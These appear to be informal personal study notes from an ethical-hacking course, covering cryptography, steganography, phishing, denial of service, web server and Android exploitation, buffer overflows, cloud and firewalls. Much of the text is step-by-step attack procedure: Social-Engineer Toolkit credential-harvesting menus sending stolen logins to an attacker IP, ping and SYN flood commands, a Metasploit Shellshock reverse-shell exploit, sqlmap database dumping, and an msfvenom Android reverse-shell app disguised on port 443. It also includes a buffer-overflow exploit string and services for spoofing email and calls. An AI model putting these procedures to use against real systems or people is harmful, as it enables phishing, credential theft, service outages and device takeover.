the formaula to calculate it is n(n-1)/2 here the n is the no. of people.

Asymmetric Encryption -> if a text is encrypted using the public key it can be decrypted only using ur private key, So if
their r 10 people then their would be 10 private key and 10 public key.So private key is kept on the individual computers
and the public keys would be available for everyone
Asymmetric can be used for confidentiality and non-repudation.

Here user A will ask for user B public key for confidentiality to encrypt data to send it from A to B,Screenshot(55)
https websites have certificates the green padlock symbol would be appearing on the address bar before the website address
u can also see the details of a website certificates that what Encryption is used in 'Subject Public Key Algorithm' and
also the Public key and when u open a website they actually sends u the public key. and what ever request u r doing it will
be encryted using this site public key and it will be decrypted by using the site private kay which would be on their server

Asymmetric for Non-Repudation ->
Now if we encrypt the msg using the private key and then it should be decrypted using the public key now their is no kind
of confidentiality, but now the sender can't deny that he didn't send the msg as the private key is only available to the
sender. and this is the digital signature.

Cryptography Hash ->
Cyptography can also be use for integrity we can do it using tool Hash Calculator, Screenshot(56), which will gie u a value
of the file or data based of the type of Hash used(MD5, SHA1 etc) and this value could be used to verify the integrity of the
file. Not all encryption protocols could be used for Hash. Same method is used for verifying the softwares that if they don't
carry any type of malicious code.

Stenography ->Screenshot(57)
We can use tools like "invisiblesecrets" for the stenography, we can also do stenography manually.
windows terminal -> copy/b	file_name_1.ext+file_name_2.ext file_name_3.ext	// /b means copy the binary, here we r hiding
the file_name_2 inside file_name_1 and the new file is file_name_3, and the size of the file_name_3 would be the sum of
size of file_name_1 and file_name_2

We can use the 'hexa editor'or 'HxD' to know that if the file is hiding something inside it, the output would be in hex
value when the file is opened in this editor.

All the file type of 'jpg' will start from 'FFD8' in hex value and it will end with 'FFD9' this is the characterstic of the
file, if u find 2 'FFD8' in a file then that means that one file is hidden inside the other file means one image is hidden
inside the other image, the 2nd FFD8 would start after the 1st FFD9, now take the hex value from the 2nd FFD8 to the 2nd
FFD9 and copy it to new file in the same hexa editor, now u will get the hidden file.

We can also hide one types of files in different types of files, means a pdf could be hidden inside the doc type file.

Stenography can be also used for metadata so on the hexa editor u can know the pic data of taken the camera and if the camera
has the GPS I can know the location

Cryptography Attack -> Offline attacks on the password were cryptographic attacks using cain.
Suppose u have a hashed file in md5, now u can file online md5 decrypter websites which have huge wordlists to crack the hash

Social Engineering -> Screenshot(60)
Social Engineering Statics -> Screenshot(58)
Social Engineering Module Flow -> Screenshot(59)

Most of the times people trust emails blindly
Go to website -> emkei.cz // to create a fake mail
A spoofed mail using sites like above could go to the spam section of some mail providers.

Phishing ->
kali terminal -> setookit		// this is a social engineering tool
> 2 // this is the option no. for fast-track, this option will scan the system look for vulnerability then hack the 
	// vulnerability and then give u access rigth but before using this tool u should update the social-engineering toolkit
	// and update the set the configurations
> 1 // this will list the different types of social engineering attacks
> 2 // this will start the website attack
> 3 // this will do the credential harvest attack which could be done on any type of OS
> 1 // this has differentn types of website templates such as of google, twitter etc to do the phishing attack or u can use
	// the option 2 which can clone the website 
> attacker_ip	// the credentials which were stolen will be send back to at this IP.
> choose_the_template_for_phishing_website	// once the victim click on the URL sent by the attacker the phishing website
// would got open on the victim machine and once victim enter his credentials it would be sent to attacker and once u
// sign in u would be get directed to real twitter.

U can use the website -> bit.ly it will mask the URL to another URL or mask the IP to a URL. 

Most of the times people uses the same passwords for their all accounts.

Vishing attack using Fake calls ->  phonecalls and text msgs can be spoofed
u can use the website such as -> spoofcard.com, it also gives the option to change ur voice

Countermeasures -> use 2 factor authentication for more security and get prevented form the social attacks, and if someone
is calling u or pretending to be from the technical support the better way to validate that is u hangup the call and call
that individual back and also do teh same for the mail and sms if someone send u a mail or sms reply back and ask u that
individual has sent u that mail or sms.

Other Social engineering attacks ->
- In this one the phishing attack is done and once the victim will open the website the payload would be installed on the
victim's computer and the attacker will get the access of the victims machine, this attack depends on the OS of the victim
machine, it depends on the anti-virus on the victim machine, broswers the victim is using etc hence u might have to try this
attack more then one time
 
Phishing ->
kali terminal -> setookit		
> 2
> 1 
> 2 
> 1 // this is for Java Applet Attack Method
> 1 // template select 
> no // for port forwarding, port forwarding would be needed when u would do it on the real time on different network
> attacker_ip // once the victim click he will got connected to us
> 2 // this will use the default applet but it's better to have ur own applet
> select_the_phishing_website
> 1	// the type of payload 'Meterpreter'
// now the attacker will wait for the connection to be established


Firewall in the organizations mostly prevent to have a connection to the machine from the outside hence it is much better
to get the connection from the inside of the organization from the victim machine.

Most of the times people gets the common msgs like update the java or download the java.

Denial of Service -> Screenshot(68) DoS affects the availability of the victim
Types of DoS Attacks ->
- Volumetric Attack - Screenshot(61), This attack depends on loading the server
cmd -> ping ip_of_the_victim_server -t -l 65000 // -l is for the size of the packet and here we r sending the 65000 bytes of 
// ICMP packet size and the -t will get the packets to be send continously untill the attacker stops it .
// U will also see that if u do ping with the above syntax on yahoo or google they will this time not send the reply back
// as they will figure out that u r trying to overload the server.

- TCP state - Screenshot(62), Here in the 3 way handshake to the server the attacker will not send the ACK flag back to the
server this way the connection would remain in pending state and the attacker will sned another SYN for another request for
connection establishment and the attacker will keep doing that untill the server is overloaded and all the resources have
been used and the normal user when sends the normal connection establishment request he will not get his connection 
established bcz their is now no slot left on the server.

- UDP Attack - Screenshot(63), In this u send the huge amount of UDP traffic and wait untill the server crash

- Fragmentation attack - Screenshot(64), Sometimes the information is large it will ve divided to different packet and once
the reiever started taking the packets it will wait for the next fragmented packet, this is done by manupulating the header
of the packet so it will crash the server

- Application layer attack - Screenshot(66), It uses a program which will create a high volume of accounts which will crash
the server or u can send a huge amount of http requests to the application untill the application crash

- DNS attack - Screenshot(67), Here u will send a huge amount of DNS requests to resolve the IP in short time of interval
that may lead to crash DNS server. 

Ex -> windows victim terminal -> start the http server on this machine so it could act like server, once the server is 
installed and the attacker side browser enter the victims IP in address bar he will see that the IIS server is started on
the windows machine.
- on attacker machine -> download from the sourceforge.net as it is a trusted provider the tool loic, on the tool enter
the required details of victim, choose HTTP attack
Note -> doing it from one computer will not crash the Server but it will definately affect it.
- Now of u go to the victims task manager, u will see that IIS server process CPU utilization is very high and increasing.
- Most of the website r hosted on Linux web server machine.

SYN Flood attack -> Screenshot(69), this will crash the rotuer, but once u restart the router it will be working fine, for
this attack we will use the tool hping3 // this tool might take more time to execute the whole attack
use the Gtrack vm as the vimtim here // it is better for the service starting.
kali terminal -> hping3 -i u100	-S -p 80 victim_ip // u is the time interval between the each request sent to victim server
// -S is for the SYN packet, -p is for port here it is 80 
// generaly the attacker do not send the SYN packet or this attack from their own machine or use proxy server

SYN Flood attack using different tool -> This tool 'Pyloris' is more effective for the Linux server based websites, enter
the required data of the victim in the tool and after some attempts it will crash the linux server.

Distributed Denial of Service -> Screenshot(70), For DoS their r counter measures which u can take for the DDoS their is
nothing u can do.

Hacking Web Server -> Screenshot(71)
Few years back their was this one vulnerability found on Apache called shell shock and bcz of that many computers were
compromised, Windows server 2003 and windows r very vulnerable OS, Web server Microsoft IIS 6 is also very vulnerable.

If u found a site with web server OS as Apache u can use Shellshock VM to exploit it
after installing it in VM do this from the attacker browser -> sheelshock_vm_ip/cgi-bin/status // and if u r getting the date
and time, actually this was the vulnerable function inside the system and u can try to hack now using this vulnerability. 

kali terminal -> service postgresql start // whenever u start metasploit u need to start this service first
kali terminal -> msfconsole
> use exploit/multi/http/apache_mod_cgi_bash_env_exec	// we r now going to specific vulnerability
> show options
> set LHOST	attacker_ip // this is where reverse connection is done
> set RHOST victim_ip
> set TARGETURI	/cgi-bin/status	// this is the vulnerable URL as we discussed in Shellshock
> set PAYLOAD linux/x86/meterpreter/reverse_tcp
> exploit // to start the exploit, if u get the meterpreter session as output then that means exploit is successful
> help // to know what or how u can exploit the victim server  

- If the OS is all patched and secure(which is almost impossible then try to look for the vulnerable services)

Hacking a Windows Server ->
kali terminal -> msfconsole
> search rpc dcom	// the metasploit will search in it's database for keyword rpc and dcom or use CVE no. instead
> use path_for_the_vulnerability_in_metasploit_given_by_above_cmd
> show options
> exploit

- Previously u need to know certain Programming launguages to use CVE's but metasploit elimate the need to know the language
as it will do that work for the attacker the, attacker know just only need to know the CVE

- Armitage is the graphical view for the Metasploit framework, do these two cmds before executing Armitage 
kali terminal -> start postgresql service
kali terminal -> msfdb init

- We do not enter the specific CVE in metasploit as we can ask metasploit to find the vulnerabilities on machine for us.

- SQL Injection from Zaid Pentesting 

- Try OWASP bricks website for practice and use other websites too for practice.

- 'vega' is a web application vulnerability scanning tool but not exploit and if their is sql injection possible inside
the web app it will give u the possible link, we can use  the sqlmap to exploit the links as
kali terminal -> sqlmap -u url_of_sqli --dbs	// --dbs will make it to try to get the all database info
kali terminal -> sqlmap -u url_of_sqli --dbms='DB_name'	--users // to get the users list and so on u can use other flags
kali terminal -> sqlmap -u url_of_sqli --dbms='DB_name'	--users --level	1 // in case u r not getting any thing on the 
infected URL, level is from 1 to 5

- To search for a injected websites via google ->
- search this on google -> google dorksfor sql injection // this way u will get a list of infected website, u will also get
the list of google operators to search for vulnerable websites

Risk Assessment -> Screenshot(72), Screenshot(73)
Risk is Buissness terminology

Risk Management Principals -> Screenshot(74)
Mitigation -> ?

Information Asset Register -> Screenshot(75)

Policy and Procedure -> Sans.org provides lots of security policy for various fields.

Security in Layers -> Screenshot(76)

Mobile Hacking ->
Anatomy of Mobile Attack -> Screenshot(77)

For Virtualization of Mobile us can use Bluestacks or mobizen but the better way would be to use a real device

Phase 1 ->
Creating a Malicious mobile App -> Once the Victim install this App he will be able to get access of the victim machine
- Many poeple do not consider to install anit virus on their mobile or tablets
- U need to have bridged network of virtualbox to simulate this attack
kali terminal -> msfvenom -p android/meterpreter/reverse_tcp LHOST attacker_ip LPORT 443 R>app.apk// -p to create a payload,
443 is https service port so if someone finds out that this device is connected to another one he will not suspect it as 
malacious bcz the 443 is regular service in usage which HTTPS port.
 
Phase 2 -> 
Copy the App at victim mobile ->
- Keep the app in ur home folder of attacker, bcz keeping it in home folder will make it hard to be detected 
- once the malicious app is copied to the victim's phone
- when victim will run the app it will try to connect to the attacker machine hence the port 443 should be open on attacker
machine for the handler to do this cmds are
kali terminal -> msfconsole
> use exploit/multi/handler
> set payload android/meterpreter/reverse_tcp
> set LHOST attacker_ip
> set LPORT 443
> exploit 

Stagefright Attack -> It is one of the most famous exploit in android devices.
kali terminal -> msfconsole
> search stagefright	// stagefright can do different kinds of attacks such as creating an mp4 file which could be used to
// get the reverse connection
> use path_for_the_vulnerability_in_metasploit_given_by_above_cmd
> set SRVHOST attacker_ip
> set URIPATH /	// '/' is here for root
> exploit // an socket address would got generated which u now need to send to the victim
> session -i // to get the session for listening from victim

Buffer Overflow -> Screenshot(78), This attack is more related to the memory of the computer in sense that u keep sending a
additional information to an application, and once the application recieve information it will keep it in memory and every
application has a specific location into the memory were he can save all the user input, now if u input more information then
the allocated memory to the application now if the developer has keep this think in consideration the application would not
accept the extra input but otherwise the input would be accepted and that extra information would be saved in different 
locations of the memory not just in the memory which is allocated to the application.

U can connect two machines using 'sikabomb' with default port 4321
cmd on machine 1 -> telnet machine_2_ip 4321
cmd on machine 2 -> start_sikabomb_application
now the question is the input given by the machine 1 is stored where in machine 2 which is memory not harddrive, the 
developer of sikabomb must have identified a location where he will all this input which has limitation in size.

cmd on machine 1 -> ./python_program_to_send_huge_amount_of_data_to_machine_2.py	// eventually the sikabomb on machine 2
will crash which shows that this program has buffer overflow 

- Some locations in memory r very critical if u r able to reach them from remote computer u can control whatever being
executing on this computer

Ways to identify if program has buffer overflow ->
- 1st way - After footprinting u will know some applications or OS also which r available on victim machine
- 2nd way (Reverse Engineering) -> In this u need to analyse the code of the OS or some open source applications
- 3rd way (Test application urself for buffer overflow) -> This is like above ex of sikabomb

- Connect using the netcat or telnet the victim machine with the attacker machine, their must be a max size limit checker
for the input to be send from one machine to another, and the input would be sent untill the application would crash this
method is called fuzzing.
- We can specific fuzzing applications for this task such as 'spike' 
- cmd -> ./generic_send_tcp victim_ip 4321 buffer_script.spk 0 0 // this is to send and execute the file on the machine 
which has sikabomb running on it, the buffer scripts inside the fuzzer have different applications such as one of them
'ability.spk' specifies the character which needed to be send continously untill the application crashes, stoping of sending
the characters from attacker fuzzer script means 2 things either it has been crashed or it has stopped taking any input.

- Inside the memory their r some specific locations, those locations r place where they r controlling what application
should be running, now during fuzzing if those characters have reached those critical locations that means we can customerize
characters by sending some code in place of them and enforce the memory to execute that code.

- 'Immunity Debugger' program is used to map memory, this tool has to be associated with specific program or we can say the
application on which the buffer overflow is to be tested, It trace the input and output of the memory for one specific
application

- Attach the program to the 'Immunity Debugger' and then on the right side box u will see 'EIP' which is very important 
place inside memory, EIP is the place in memory that control the flow or decide what program to be executed

- EIP can only accept 4 characters

- Another important place is 'ESP', it's like a container that holds the program that will be executed

- Try the attack using Fuzzer with Immunity Debugger open, and if u find out that EIP and ESP has been overwritten with the
character send by the Fuzzer program to this program that means the attacker is able to reach the critical place inside the
memory, the characters which r overwriting these locations will be in format of Hexadecimal
- After identifying the possiblity of Buffer overflow we need to identify few other things before proceeding 

How many characters were allowed to override the location in memory before crashing the application?
- we can use wireshark for this task as u can copy the TCP stream which is the data of fuzzing and then paste it in a file
and then count them using 'wc' and their is one empty space in it so 'no. of total characters - 1' is the answer

- now we need to figure out that which characters out of total characters have actually overwritten the EIP and ESP location
 we can use a tool for this task called 'pattern_create' and 'pattern_offset' which u can find in the location ->
 /pentest/exploits/framework3/tools
 cmd -> ./pattern_create.rb 5000 // this will create 5000 characters
- U can use some python scripts for fuzzing instead of using applications but the difference is that a fuzzer application
sends the characters untill the application is crashed but in script we need to decide the limit if the characters

- Copy those 500 characters created via pattern_create.rb and paste it in python script which u need to use for fuzzing.
- Now do the buffer attack in same way done before using the immunity debugger
- Note down the characters in place of EIP and ESP metioned in Immunity Debugger
- Use pattern_offset.rb for identifying the characters which u overwriting the EIP and ESP
cmd -> ./pattern_offset.rb characters_no // the output will be the no. after which the characters started overwirtting EIP

- Now edit the script for fuzzer as like this 
buffer = '\x41' + no._after_overwritting_start + '\x42' + '\x43' * total_characters_send - no._after_overwritting_start
- Use Framework2-Msfweb for creating the payload // open the website in browser which is given when u eecute this tool
on the website u will see the lists of payload available for attacks, check the size of the payload as it should be equal
to the 'no. of total characters' used for fuzzing.
- In the script for fuzzing do the following changes ->
shell = (payload)
buffer = '\x41' + no._after_overwritting_start + '\x42\x42\x42\x42' + shell + '\x43' * (total_characters_send -
 no._after_overwritting_start + payload_size)
 
- The payload will not be executed automatically in EIP, so we need to put something in EIP which will enforce to run what
ever is in ESP, we need to find for this 'Jump ESP' in machine, Go to Immunity debugger and then to tab 'e', this will show
all the processes run inside the memory and look for 'USER32' and 'kernel' in the list appeared in Immunity debugger,
, right click on 'USER32' and then 'search for' -> 'command', u will the code in the format of Hexadecimals  

- In the script for fuzzing do the following changes ->
shell = (payload)
buffer = '\x41' + no._after_overwritting_start + '\x53\x93\x42\x7E' + '\x90' * 16 + shell + '\x43' * (total_characters_send
 - no._after_overwritting_start + payload_size + 16) // here 16 is for the NULL as the empty space where shell code could be
executed, this is best practice, '\x53\x93\x42\x7E' this is Jump ESP code 
- if the payload is for the reverse connection attack then just u need to listen for the connection using netcat

Cloud Computing -> Screenshot(81),Screenshot(82)
- Offie365 is example of SaaS
- SaaS, Screenshot(83)

PaaS- ex -> Google app engine, microsoft azure, Screenshot(84)

IaaS- U can lease a physical machine from the cloud provider or a virtual machine, ex- AWS, Rackspace

Cloud Deployement -> Screenshot(88), Types of Deployement -> Public, Private, Hybrid, Community

- Their has been many breaches in Public cloud in recent time.

Private Cloud -> Screenshot(85), Screenshot(86), Screenshot(87)

Public Cloud -> Screenshot(89), Screenshot(90)

Advantages of Public Cloud -> Screenshot(91),
Disadvantages of Public cloud -> Screenshot(92), Screenshot(93)

Hybrid Cloud -> Screenshot(94), Screenshot(95)

NIST SP 800-145 -> For standard and best practices for cloud computing, search for this topic on google. # Imp for Exam

Honeypots -> U can install 'HoneyBot' in the machine from website 'atomicsoftwaresolutions.com'

If u do nmap scan on victim machine without honeypot u will see that only few ports r open and once the honeypot is 
installed u will see too many ports r open and once the attacker try to connect to any service which is virtual or fake 
service , the victim will get the information about the hacker on it's system.

Evading Honeypots -> ?

Firewalls -> Screenshot(96)
Go to Windows machine -> control panel -> windows defender firewall -> Advanced settings -> Outbound rules(u will see the
list of rules for outbound traffic from machine) -> Click on 'New Rule' option, Now just define ur rule

ACL -> Screenshot(97), this is to block and allow the machines to be connected it's somewhat same as firewall, it's generaly
used between two networks

For practicing the ACL working we can use the 'Cisco Packet Tracer'.

Standard ACL -> Screenshot(98)

IDS -> Screenshot(99)
Types ->
- Behaviour Based, it's more effective, but it's not easy to configure
- Signature based
- Use program 'snort' for practicing and seeing the working of IDS

Wireless Network hacking -> Screenshot(100), do it from Zaid Wifi hacks
Screenshot(101)

Port Forwarding -> Screenshot(102)
Public IP is router IP not the IP assigned to u by the router, for the reverse connection from victim the victim machine 
needs attacker public IP and Port

- Go to ur router page from browser, login then select advance settings, then go to Port Forwarding option and then 
configure the settings
- Now to do the Remote hacking
- cmd attacker machine -> nmap -sS public_ip_of_attacker	// all the ports configured for port forwarding would be open
with status as 'filtered'
- use tool 'SET'
 > 1
 > 2
 > 1
 > 1
 > Yes // this is for question if u r using Port forwarding
 > attacker_public_ip
 > no
 > 2
 > 1
 > 2
 > 1
 > port_no // this port should be forwarded to the attacker machine
 > 6
 
// now if the created payload, now if on any network or machine attacker put the public IP it would be get connected to
the attacker machine
// from victim machine browser address bar -> https://public_ip_of_attacker , we use https bcz we r doing port frowarding
on port 443
- we can use the all attacks earlier just put the public ip in place of private ip, but it's not the right way properly
as ur public_ip is exposed

Vulnerability Analysis ->
Vulnerability assessment should be done by the organization at least twice a year, in ur resume put both the pentester
and vulnerabilites assessment 

- Nessus is one of the tools which is used for Vulnerability Assessment, use Nessus Home for free but it will have the
limit for few IP's
- In nessus site -> create new scan -> select the type of scan 
- after downloading the report from nessus on 'csv' format save the same file in excel format

OWASP ZAP -> it is same as burp suite

- Nexpose from rapid7 is used for Vulnerability assessment, nexpose can be used in different network

IoT -> Screenshot(103)
- U can do brute force on IOT and other attacks as the same concept of attacks is applied

Components of IoT implementation -> Screenshot(104)

IoT implementation layer wise -> Screenshot(105), each layer has it's own vulnerabilites and weaknesses.
